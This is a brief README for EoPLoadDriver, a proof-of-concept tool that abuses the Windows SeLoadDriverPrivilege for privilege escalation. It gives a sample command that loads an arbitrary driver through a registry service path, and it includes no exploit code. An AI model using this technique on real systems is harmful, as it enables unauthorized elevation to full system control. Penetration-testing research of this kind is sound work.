# EoPLoadDriver
Proof of concept for abusing SeLoadDriverPrivilege (Privilege Escalation in Windows)

# Usage
```bash
EOPLOADDRIVER.exe RegistryServicePath DriverImagePath
eg: EOPLOADDRIVER.exe System\\CurrentControlSet\\MyService C:\\Users\\Username\\Desktop\\Driver.sys
```
